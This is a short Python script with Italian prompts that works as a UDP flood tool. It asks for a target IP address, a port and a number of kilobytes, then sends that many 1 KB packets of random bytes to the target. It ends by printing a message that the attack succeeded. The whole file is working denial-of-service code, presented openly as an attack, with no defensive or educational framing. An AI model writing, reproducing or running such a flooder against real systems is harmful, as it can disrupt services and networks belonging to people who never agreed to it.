import socket
import random

ip_target =  input("inserisci qui l'indirizzo ip del bersaglio target\n")
porta_target = int(input("inserisci qui il numero della porti del bersaglio target\n "))
byte_da_inviare =int(input("Inserisci il numero di  kb da inviare\n"))


s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

conto_byte = byte_da_inviare


pacchetto_dati = random.randbytes(1024)



for _ in range(conto_byte):
	s.sendto(pacchetto_dati, (ip_target, porta_target))


s.close()

print("attacco andato a buon fine")
